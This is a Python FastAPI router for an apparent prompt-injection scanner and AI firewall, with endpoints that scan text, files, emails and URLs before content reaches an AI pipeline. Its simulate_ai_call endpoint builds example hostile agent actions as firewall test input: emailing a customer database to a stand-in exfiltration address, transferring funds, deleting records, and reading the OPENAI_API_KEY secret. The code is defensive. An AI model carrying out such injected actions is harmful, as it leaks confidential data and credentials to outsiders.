"""Scanning endpoints: text, PDF/upload, email, URL and multi-document batches."""
from __future__ import annotations

import io

from fastapi import APIRouter, Depends, File, HTTPException, Request, UploadFile, status

from .. import ai, auth, config, crossdoc, db, extract, service
from ..models import EmailScanRequest, MultiDocumentRequest, TextScanRequest, UrlScanRequest
from ..security.classifier import analyze_text

router = APIRouter(prefix="/api", tags=["scanning"])

_scan_limiter = auth.SlidingWindowLimiter(limit_per_minute=config.RATE_LIMIT_SCAN_PER_MINUTE)


def _guard(request: Request, user: dict) -> None:
    allowed, retry_after = _scan_limiter.check(f"scan:{user.get('email')}:{auth.client_key(request)}")
    if not allowed:
        raise HTTPException(
            status.HTTP_429_TOO_MANY_REQUESTS,
            "Scan rate limit exceeded. Please wait before submitting more content.",
            headers={"Retry-After": str(retry_after)},
        )


def _analyse_and_store(
    text: str,
    *,
    source_name: str,
    source_type: str,
    user: dict,
    extraction: dict | None = None,
    extra_signals: dict | None = None,
    metadata: dict | None = None,
    batch_id: str | None = None,
) -> dict:
    scan_id = db.new_id("scan")
    analysis = analyze_text(
        text,
        source_name=source_name,
        source_type=source_type,
        scan_id=scan_id,
        extra_signals=extra_signals or {},
        metadata=metadata or {},
    )
    analysis["scan_id"] = scan_id
    record = service.record_scan(analysis, user, extraction)
    if batch_id:
        db.get_store().update("scans", scan_id, {"batch_id": batch_id})
        record["batch_id"] = batch_id
    return record


@router.post("/scan/text", status_code=status.HTTP_201_CREATED)
def scan_text(payload: TextScanRequest, request: Request, user: dict = Depends(auth.require("scan"))) -> dict:
    """Scan pasted text, raw HTML or an email body."""
    _guard(request, user)
    declared = payload.declared_type

    if declared == "html":
        # Reuse the HTML extractor so hidden nodes/comments are surfaced.
        try:
            extraction = extract.extract_bytes(payload.source_name or "pasted.html", payload.content.encode("utf-8"))
        except extract.ExtractionError as exc:
            raise HTTPException(status.HTTP_422_UNPROCESSABLE_ENTITY, str(exc)) from exc
        text = extraction["text"]
        hidden = extraction.get("hidden_segments", [])
        return _analyse_and_store(
            text,
            source_name=payload.source_name,
            source_type="html",
            user=user,
            extraction=extraction,
            extra_signals={"hidden_segments": hidden},
            metadata={"notes": payload.notes, "declared_type": declared},
        )

    return _analyse_and_store(
        payload.content,
        source_name=payload.source_name,
        source_type=declared,
        user=user,
        metadata={"notes": payload.notes, "declared_type": declared},
    )


@router.post("/scan/pdf", status_code=status.HTTP_201_CREATED)
async def scan_pdf(
    request: Request,
    file: UploadFile = File(..., description="PDF, TXT, HTML or .eml file"),
    user: dict = Depends(auth.require("scan")),
) -> dict:
    """Upload a document. Type is decided by sniffing, never by the client MIME type."""
    _guard(request, user)
    data = await file.read(config.MAX_UPLOAD_BYTES + 1)
    if len(data) > config.MAX_UPLOAD_BYTES:
        raise HTTPException(
            status.HTTP_413_REQUEST_ENTITY_TOO_LARGE,
            f"File exceeds the {config.MAX_UPLOAD_BYTES // (1024 * 1024)} MB limit.",
        )
    try:
        extraction = extract.extract_bytes(file.filename or "upload", data)
    except extract.ExtractionError as exc:
        raise HTTPException(status.HTTP_422_UNPROCESSABLE_ENTITY, str(exc)) from exc

    source_type = extraction["kind"]
    return _analyse_and_store(
        extraction["text"],
        source_name=extraction["filename"],
        source_type=source_type,
        user=user,
        extraction=extraction,
        extra_signals={"hidden_segments": extraction.get("hidden_segments", [])},
        metadata={"upload_bytes": len(data), "warnings": extraction.get("warnings", [])},
    )


@router.post("/scan/email", status_code=status.HTTP_201_CREATED)
def scan_email(payload: EmailScanRequest, request: Request, user: dict = Depends(auth.require("scan"))) -> dict:
    """Scan a raw RFC-822 email (headers are analysed for display-name spoofing)."""
    _guard(request, user)
    raw = payload.raw_email.encode("utf-8", errors="replace")
    if b"\n" in raw and (b"from:" in raw.lower() or b"subject:" in raw.lower()):
        try:
            extraction = extract.extract_bytes(payload.source_name or "message.eml", raw)
        except extract.ExtractionError as exc:
            raise HTTPException(status.HTTP_422_UNPROCESSABLE_ENTITY, str(exc)) from exc
        text = extraction["text"]
        meta = extraction["metadata"]
    else:
        text = payload.raw_email
        meta = {"parsed": False}

    return _analyse_and_store(
        text,
        source_name=payload.source_name,
        source_type="email",
        user=user,
        extraction={"kind": "email", "filename": payload.source_name, "metadata": meta, "warnings": []},
        metadata={"email_metadata": meta},
    )


@router.post("/scan/url", status_code=status.HTTP_201_CREATED)
def scan_url(payload: UrlScanRequest, request: Request, user: dict = Depends(auth.require("scan"))) -> dict:
    """Fetch a public URL (SSRF-guarded) and scan its visible and hidden text."""
    _guard(request, user)
    try:
        fetched = extract.fetch_url(payload.url)
    except extract.ExtractionError as exc:
        raise HTTPException(status.HTTP_422_UNPROCESSABLE_ENTITY, str(exc)) from exc

    return _analyse_and_store(
        fetched["text"],
        source_name=fetched.get("final_url") or payload.url,
        source_type="url",
        user=user,
        extraction={"kind": "url", "filename": payload.url, "metadata": fetched.get("metadata", {}), "warnings": []},
        extra_signals={"hidden_segments": fetched.get("hidden_segments", [])},
        metadata={"url": payload.url, "status_code": fetched.get("status_code")},
    )


@router.post("/analyze/multiple-documents", status_code=status.HTTP_201_CREATED)
def analyze_multiple(
    payload: MultiDocumentRequest, request: Request, user: dict = Depends(auth.require("scan"))
) -> dict:
    """Cross-document campaign analysis over previously scanned documents."""
    _guard(request, user)
    scans = []
    for scan_id in payload.scan_ids:
        record = service.get_scan(scan_id)
        if not record:
            raise HTTPException(status.HTTP_404_NOT_FOUND, f"Scan {scan_id} not found.")
        scans.append(record)

    batch = crossdoc.analyze_batch(scans, payload.label, user)
    batch_id = batch.get("id") or db.new_id("batch")
    batch["id"] = batch_id
    for scan in scans:
        db.get_store().update("scans", scan["id"], {"batch_id": batch_id})
    db.insert("batches", batch)
    db.audit(
        user,
        "crossdoc.analyzed",
        f"Analysed {len(scans)} documents as batch '{payload.label or 'untitled'}'",
        {"batch_id": batch_id, "risk": batch.get("campaign_risk")},
    )
    return batch


@router.get("/scans/{scan_id}")
def get_scan(scan_id: str, user: dict = Depends(auth.require("read"))) -> dict:
    record = service.get_scan(scan_id)
    if not record:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "Scan not found.")
    return record


@router.get("/scans")
def list_scans(
    limit: int = 50,
    source_type: str | None = None,
    user: dict = Depends(auth.require("read")),
) -> dict:
    return {"scans": service.list_scans(limit=min(limit, 200), source_type=source_type)}


@router.post("/scans/{scan_id}/ai-process")
def ai_process(scan_id: str, user: dict = Depends(auth.require("scan"))) -> dict:
    """Run the AI-processing stage: content is passed as untrusted data only."""
    record = service.get_scan(scan_id)
    if not record:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "Scan not found.")
    if record["decision"] in {"block", "quarantine"}:
        raise HTTPException(
            status.HTTP_409_CONFLICT,
            f"Content is {record['decision_label']}. Blocked content is never passed to the AI pipeline.",
        )
    result = ai.process_scan(record, user)
    db.get_store().update("scans", scan_id, {"ai_processing": result})
    return result


@router.post("/scans/{scan_id}/simulate-ai-call")
def simulate_ai_call(scan_id: str, user: dict = Depends(auth.require("scan"))) -> dict:
    """Demonstration: what the AI would attempt if it obeyed the content.

    The requested action is derived from the content's detected categories and
    then submitted to the firewall, which decides independently.
    """
    record = service.get_scan(scan_id)
    if not record:
        raise HTTPException(status.HTTP_404_NOT_FOUND, "Scan not found.")
    from .. import firewall

    categories = set(record.get("threat_categories", []))
    if "data_exfiltration" in categories:
        action = {
            "action_type": "send_email",
            "origin": "external_content",
            "user_role": user.get("role", "analyst"),
            "source_scan_ids": [scan_id],
            "parameters": {
                "to": "exfil-collector@external-collect.example",
                "subject": "Confidential export",
                "body": "Attached: customer database export requested by the document.",
                "attachment": "customers.csv",
                "data_classification": "confidential",
            },
            "intent": "Send confidential data to an external address requested by the document.",
        }
    elif "unauthorized_payment" in categories or "destructive_action" in categories:
        action = {
            "action_type": "transfer_funds" if "unauthorized_payment" in categories else "delete_records",
            "origin": "external_content",
            "user_role": user.get("role", "analyst"),
            "source_scan_ids": [scan_id],
            "parameters": {
                "amount": 9500,
                "currency": "USD",
                "destination_account": "4417-2231",
                "data_classification": "restricted",
            },
            "intent": "Perform a privileged operation requested by the untrusted document.",
        }
    else:
        action = {
            "action_type": "read_secret",
            "origin": "external_content",
            "user_role": user.get("role", "analyst"),
            "source_scan_ids": [scan_id],
            "parameters": {"secret_name": "OPENAI_API_KEY", "data_classification": "restricted"},
            "intent": "Read a secret requested by the untrusted document.",
        }

    decision = firewall.validate_action(action, user, [record])
    return {"requested_action": action, "firewall": decision}
